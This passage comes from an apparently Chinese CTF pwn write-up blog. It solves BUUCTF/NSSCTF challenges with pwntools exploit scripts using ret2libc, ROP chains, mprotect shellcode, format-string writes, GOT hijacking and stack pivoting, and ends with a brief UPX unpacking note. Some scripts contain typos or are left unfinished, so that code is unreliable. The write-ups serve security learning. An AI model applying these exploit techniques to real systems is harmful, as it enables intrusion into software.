class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h4 id="32位-ret2libc"><a href="#32位-ret2libc" class="headerlink" title="-&gt;32位 ret2libc"></a>-&gt;32位 ret2libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">![libc](BUU%E5%<span class="number">88</span>%B7%E9%A2%<span class="number">98</span>/libc.png)<span class="comment"># Libc泄露：通过什么函数来泄露？ 找到这个函数之后，elf.got elf.plt , </span></span><br><span class="line"><span class="comment"># Libc泄露：通过write函数来泄露。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29598</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_pot) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#选择 libc6-i386_2.27-3ubuntu1_amd64 这个libc版本</span></span><br></pre></td></tr></table></figure></div>



<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libcsearch.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libc.png"></p>
<p>泄露出来一个函数的真实地址后，去那个网站搜索一下 对应的版本 </p>
<p>-&gt; 如果只泄露出来一个函数，可能对应有很多个版本，可以泄露多个函数缩小范围（因为有多个版本时，需要一个一个试）</p>
<p>-&gt; 下面这个图应该就是对应 offest的解释吧（看别人的Wp之后的理解）</p>
<p>我们此时应该已知 &#x3D;&gt; write函数真实地址 知道了两个write_offest system_offest</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">system_real_addr = write_real_addr + system_offest - write_offest</span><br><span class="line">bin_sh_real_addr = write_real_addr + str_bin_sh_offest - write_offest</span><br></pre></td></tr></table></figure></div>



<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>checksec一下：</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/01.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/00.png"></p>
<p>可知将var[13]赋值一个17(0x11)就可以得到shell</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>但是这个payload并没有打通。</p>
<p><strong>这里有个知识点:</strong></p>
<blockquote>
<p>qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它自然是word（2字节，0~2^16-1）的四倍，8字节</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p64(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><h3 id="学习：32位和64位传参的区别"><a href="#学习：32位和64位传参的区别" class="headerlink" title="学习：32位和64位传参的区别"></a>学习：32位和64位传参的区别</h3><p><strong>32位：</strong>直接将参数放在栈中</p>
<p><strong>64位：</strong>前六个参数放在寄存器中（rdi rsi rdx rcx r8 r9），如果还有参数，那再依次放入栈中</p>
<h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a><strong>题解：</strong></h3><p>这个题是64位程序，在ida中打开，发现有栈溢出漏洞（vulnerable_function函数中）</p>
<p><code>Shift + F12</code> 可以看到有<code>system</code>函数和 <code>/bin/sh</code>字符串</p>
<p>-&gt; 先覆盖buf和rbp</p>
<p>-&gt; 然后是 pop rdi ret &#x3D;&gt; 将栈顶元素（binsh字符串的地址）弹入rdi寄存器中，并且返回到下一指令处</p>
<p>-&gt; 然后是返回到system()的地址</p>
<p>-&gt; 参数就是rdi寄存器中的 binsh字符串</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span><span class="number">26999</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>rdi的地址这样找：</p>
<p><code>ROPgadget --binary level2_x64 --only &#39;pop|ret&#39;</code></p>
</blockquote>
<h2 id="not-the-same-3dsctf-2016-静态-32位"><a href="#not-the-same-3dsctf-2016-静态-32位" class="headerlink" title="not_the_same_3dsctf_2016[静态 32位]"></a>not_the_same_3dsctf_2016[静态 32位]</h2><p><code>ctrl + x</code> 查看调用字符串的位置</p>
<p><code>ctrl + s</code>调出程序的段表，</p>
<p><code>mprotect(void *addr, size_t len, int prot)函数</code></p>
<p>-&gt; addr 内存启始地址；len 修改内存的长度；prot 内存的权限</p>
<p>-&gt; 将.got.plt段改写为可读可写可执行的</p>
<p><strong>肯定有人疑问了为什么是0x80EB000而不是bss段的开头0x80EBF80，因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25763</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>checksec一下 32位 有NX保护（栈不可执行），canary保护（会放入一个值，在返回的时候会进行检查，得保证这个值没变）</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/02.png"></p>
<p>偏移量的计算 10 &#x3D;&gt; 我们输入的数据是从第十个开始的</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/03.png"></p>
<p>A的ascii值是65 &#x3D;&gt; 对应十六进制的0x41             a的ascii值是97 &#x3D;&gt; 对应十六进制的0x61</p>
<p>程序要求我们输入的值与随机数相等，才可以执行<code>system(&#39;bin/sh&#39;)</code></p>
<p>&#x3D;&gt; 由于存在格式化字符串漏洞</p>
<p>我们可以通过<code>%n</code> 来修改储存随机数的地址的值</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/04.png"></p>
<p>随机数起始地址是在 0x804c044 由于随机数是四位 </p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + p32(<span class="number">0x804c045</span>) + p32(<span class="number">0x804c046</span>) + p32(<span class="number">0x804c047</span>)</span><br><span class="line">payload += <span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>



<p>给Bss赋值，使得NX不可执行变为可执行 &#x3D;&gt; 构建shellcode</p>
<div class="highlight-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">int mprotect(const void <span class="emphasis">*start, size_t len, int prot);</span></span><br><span class="line"><span class="emphasis">	第一个参数填的是一个地址，是指需要进行操作的地址。</span></span><br><span class="line"><span class="emphasis">	第二个参数是地址往后多大的长度。</span></span><br><span class="line"><span class="emphasis">	第三个参数的是要赋予的权限。</span></span><br><span class="line"><span class="emphasis">mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</span></span><br><span class="line"><span class="emphasis">prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</span></span><br><span class="line"><span class="emphasis">　　1）PROT_READ：表示内存段内的内容可写；</span></span><br><span class="line"><span class="emphasis">　　2）PROT_WRITE：表示内存段内的内容可读；</span></span><br><span class="line"><span class="emphasis">　　3）PROT_EXEC：表示内存段中的内容可执行；</span></span><br><span class="line"><span class="emphasis">　　4）PROT_NONE：表示内存段中的内容根本没法访问。</span></span><br><span class="line"><span class="emphasis">prot=7表示可读可写可执行，将它类比于chmod中的7</span></span><br></pre></td></tr></table></figure></div>



<h2 id="HDCTF-2023-KEEP-ON"><a href="#HDCTF-2023-KEEP-ON" class="headerlink" title="[HDCTF 2023]KEEP ON"></a>[HDCTF 2023]KEEP ON</h2><h3 id="知识点：格式化字符串劫持、栈迁移"><a href="#知识点：格式化字符串劫持、栈迁移" class="headerlink" title="知识点：格式化字符串劫持、栈迁移"></a><strong>知识点：格式化字符串劫持、<a class="link" href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></h3><p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/10.png"></p>
<h3 id="法1-格式化字符串劫持-将printf-got-改成-system-plt"><a href="#法1-格式化字符串劫持-将printf-got-改成-system-plt" class="headerlink" title="法1,格式化字符串劫持(将printf_got 改成 system_plt)"></a><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>寻找偏移量 找 616161在第几位 </p>
<p>​	-&gt; 我们输入的是aaaa 0x61(十六进制 -&gt; ascii的97)即a</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/11.png"></p>
<h3 id="法2-栈迁移-可以先阅读前面的那个文章"><a href="#法2-栈迁移-可以先阅读前面的那个文章" class="headerlink" title="法2,栈迁移,可以先阅读前面的那个文章"></a>法2,栈迁移,可以先阅读前面的那个文章</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<p>Q&amp;A（个人理解）</p>
<p><code>%16$p是哪来的</code></p>
<p>-&gt;可以用过gdb动态调试得到old_rbp的具体值,然后通过尽量多的%p来泄露出具体位置</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/12.png"></p>
<p><code>0x60是哪里来的?</code></p>
<p>-&gt;子函数中栈底指向了父函数的栈底的地址, 0x7fffffffe1e0就是old_rbp - 0x7fffffffe180&#x3D;0x60</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/13.png"></p>
<p><code>payload中为什么要加0x20 ?</code></p>
<p>-&gt; 0x20 &#x3D; 32 &#x3D;&gt; 4个8字节, 指向了&#x2F;bin&#x2F;sh所在的位置</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/14.png"></p>
<h2 id="BUU-HNCTF-2022-Week1-fmtstrre"><a href="#BUU-HNCTF-2022-Week1-fmtstrre" class="headerlink" title="BUU-[HNCTF 2022 Week1]fmtstrre"></a>BUU-[HNCTF 2022 Week1]fmtstrre</h2><p>先checksec一下</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/06.png"></p>
<p>然后IDA(64)打开</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/09.png"></p>
<blockquote>
<p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
<p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
<p>将name的地址赋值给v5</p>
<p>再向buf中写入256字节数据</p>
</blockquote>
<p>格式化字符串漏洞点 <code>printf(buf)</code></p>
<p><code>这段代码中需要打开flag这个文件 =l&gt; 小技巧</code></p>
<p>-&gt; 在当前目录下创建一个flag文件，并输入一些东西，可以帮助我们观察其在栈上的位置。</p>
<p>-&gt;当然,这个文件不是必须的.</p>
<p><code>该如何利用这个漏洞？</code>根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
<p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
<p><strong>参考<a class="link" href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/07.png"></p>
<blockquote>
<p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/08.png"></p>
<blockquote>
<p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
<p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
<p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
</blockquote>
<p>32 + 6 &#x3D;38</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a><strong>exp:</strong></h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p><code>open(&quot;/dev/urandom&quot;, 0);</code></p>
<p>-&gt; <code>/dev/urandom</code>这个文件是产生随机数的</p>
<p>-&gt; 0 是表示以只读模式打开</p>
<p>-&gt; 如果open调用成功，返回一个非负整数 ； 如果调用失败，返回-1</p>
<p><code>read(0, buf, 32u);</code></p>
<p>-&gt; 从 0（标准输入[键盘]）中读取32字节数据 存放在buf中</p>
<p>-&gt; 如果成功读取，返回实际读取的字节数</p>
<p>-&gt; 如果未成功读取，返回-1，并设置全局变量errno来指示错误原因</p>
<p><code>strncmp(buf, s, v1) </code></p>
<p>-&gt;用于比较前两个字符串[buf s]的 前v1 个字符</p>
<p>-&gt;如果前v1个字符都相同，返回0 ； 如果不同，则返回第一个不匹配的字符的ASCII码差值</p>
<p><strong>找不到system和binsh，很明显要通过构造Rop寻找libc</strong></p>
<p>题目提供了libc文件</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27244</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = offest + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#bin_sh_addr = offest + libc.search(&#x27;bin/sh&#x27;).next()</span></span><br><span class="line">bin_sh_addr = offest + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="Buu-jarvisoj-fm-fm-n任意内存写入"><a href="#Buu-jarvisoj-fm-fm-n任意内存写入" class="headerlink" title="Buu - jarvisoj_fm[ fm %n任意内存写入]"></a>Buu - jarvisoj_fm[ fm %n任意内存写入]</h2><p>checksec一下 32位，用IDA打开</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-00.png"></p>
<p><strong>思路：</strong></p>
<p>要想shell，肯定要满足x&#x3D;&#x3D;4；</p>
<p>然后又看到有<code>printf(buf)</code> 格式化字符串漏洞标志</p>
<p>&#x3D;&gt; 通过%n向x地址写入4</p>
<p><strong>1.确定偏移量</strong></p>
<p>这是32位程序，第一个参数可以写入AAAA &#x3D; ( 正好占满一个栈的小格子(4字节)的空间 )</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-01.png"></p>
<p>-&gt; %08，让长度为8，比较容易好看吧，这个无所谓</p>
<p>-&gt; %x(打印十六进制数据) 或者 %p(打印栈上数据)均可</p>
<p>&#x3D;&#x3D;&gt; 偏移量为11</p>
<p><strong>2.通过<code>%(偏移量)$n</code>来写入值</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># if语句中可以调用system(&#x27;bin/sh&#x27;) =&gt; 满足if语句</span></span><br><span class="line"><span class="comment"># 让x=4</span></span><br><span class="line"><span class="comment"># x - addr：0804A02C</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25301</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./fm&#x27;)</span></span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">&quot;%11$n&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Re刷题记录</title>
    <url>/CTF/Re/Re%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="Buu-新年快乐-初用upx"><a href="#Buu-新年快乐-初用upx" class="headerlink" title="Buu - 新年快乐 [ 初用upx ]"></a>Buu - 新年快乐 [ 初用upx ]</h2><p>32位有壳</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-00.png"></p>
<blockquote>
<p>加壳 upx.exe filename</p>
<p>脱壳 upx.exe -d filename</p>
</blockquote>
<p><strong>在upx目录下打开终端，将软件放在相同目录（或者直接给出绝对路径）</strong></p>
<p>脱完壳之后用32位ida打开，进入main函数，</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-01.png"></p>
<p>str2就是flag</p>
